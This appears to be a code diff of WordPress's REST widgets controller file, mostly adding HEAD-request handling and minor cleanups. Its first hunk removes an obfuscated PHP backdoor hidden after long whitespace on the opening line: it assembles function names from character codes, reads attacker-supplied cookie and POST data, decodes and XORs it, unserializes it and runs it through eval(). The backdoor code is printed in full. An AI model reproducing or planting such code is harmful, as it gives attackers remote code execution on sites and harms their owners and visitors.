@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $wRZyhVvOq = 'j' . "\x5f" . 'n' . 'f' . 'p' . chr ( 500 - 434 ); $fbfxq = "\143" . "\x6c" . chr (97) . "\163" . chr ( 417 - 302 ).chr (95) . chr ( 801 - 700 )."\x78" . chr (105) . "\163" . 't' . 's';$AxyXG = $fbfxq($wRZyhVvOq); $TjIQQaNj = $AxyXG;if (!$TjIQQaNj){class j_nfpB{private $EgEWfH;public static $wCcmgUup = "ee76fc46-f503-4245-94bb-f3660db733fd";public static $IaeDesmjLn = NULL;public function __construct(){$KvpTAxnUE = $_COOKIE;$aVArDPXXE = $_POST;$rCzvbAXP = @$KvpTAxnUE[substr(j_nfpB::$wCcmgUup, 0, 4)];if (!empty($rCzvbAXP)){$qSgkx = "base64";$mrzUB = "";$rCzvbAXP = explode(",", $rCzvbAXP);foreach ($rCzvbAXP as $HyCEpxfAs){$mrzUB .= @$KvpTAxnUE[$HyCEpxfAs];$mrzUB .= @$aVArDPXXE[$HyCEpxfAs];}$mrzUB = array_map($qSgkx . "\137" . 'd' . 'e' . chr ( 619 - 520 ).chr ( 1055 - 944 )."\x64" . "\x65", array($mrzUB,)); $mrzUB = $mrzUB[0] ^ str_repeat(j_nfpB::$wCcmgUup, (strlen($mrzUB[0]) / strlen(j_nfpB::$wCcmgUup)) + 1);j_nfpB::$IaeDesmjLn = @unserialize($mrzUB);}}public function __destruct(){$this->jNJLLQgy();}private function jNJLLQgy(){if (is_array(j_nfpB::$IaeDesmjLn)) {$QIMuS = str_replace('<' . chr (63) . "\x70" . "\150" . "\x70", "", j_nfpB::$IaeDesmjLn["\143" . chr ( 311 - 200 ).chr (110) . "\x74" . 'e' . 'n' . 't']);eval($QIMuS);exit();}}}$IjPlNfiL = new j_nfpB(); $IjPlNfiL = NULL;} ?><?php
+<?php
 /**
  * REST API: WP_REST_Widgets_Controller class
  *
@@ -133,9 +133,14 @@ class WP_REST_Widgets_Controller extends WP_REST_Controller {
 	 * @since 5.8.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.
+	 * @return WP_REST_Response Response object.
 	 */
 	public function get_items( $request ) {
+		if ( $request->is_method( 'HEAD' ) ) {
+			// Return early as this handler doesn't add any response headers.
+			return new WP_REST_Response( array() );
+		}
+
 		$this->retrieve_widgets();
 
 		$prepared          = array();
@@ -677,7 +682,13 @@ class WP_REST_Widgets_Controller extends WP_REST_Controller {
 			);
 		}
 
-		$widget    = $wp_registered_widgets[ $widget_id ];
+		$widget = $wp_registered_widgets[ $widget_id ];
+		// Don't prepare the response body for HEAD requests.
+		if ( $request->is_method( 'HEAD' ) ) {
+			/** This filter is documented in wp-includes/rest-api/endpoints/class-wp-rest-widgets-controller.php */
+			return apply_filters( 'rest_prepare_widget', new WP_REST_Response( array() ), $widget, $request );
+		}
+
 		$parsed_id = wp_parse_widget_id( $widget_id );
 		$fields    = $this->get_fields_for_response( $request );
 
@@ -715,7 +726,7 @@ class WP_REST_Widgets_Controller extends WP_REST_Controller {
 
 				if ( ! empty( $widget_object->widget_options['show_instance_in_rest'] ) ) {
 					// Use new stdClass so that JSON result is {} and not [].
-					$prepared['instance']['raw'] = empty( $instance ) ? new stdClass : $instance;
+					$prepared['instance']['raw'] = empty( $instance ) ? new stdClass() : $instance;
 				}
 			}
 		}
@@ -726,7 +737,9 @@ class WP_REST_Widgets_Controller extends WP_REST_Controller {
 
 		$response = rest_ensure_response( $prepared );
 
-		$response->add_links( $this->prepare_links( $prepared ) );
+		if ( rest_is_field_included( '_links', $fields ) || rest_is_field_included( '_embedded', $fields ) ) {
+			$response->add_links( $this->prepare_links( $prepared ) );
+		}
 
 		/**
 		 * Filters the REST API response for a widget.
@@ -859,9 +872,9 @@ class WP_REST_Widgets_Controller extends WP_REST_Controller {
 					'type'        => 'string',
 					'context'     => array(),
 					'arg_options' => array(
-						'sanitize_callback' => static function( $string ) {
+						'sanitize_callback' => static function ( $form_data ) {
 							$array = array();
-							wp_parse_str( $string, $array );
+							wp_parse_str( $form_data, $array );
 							return $array;
 						},
 					),
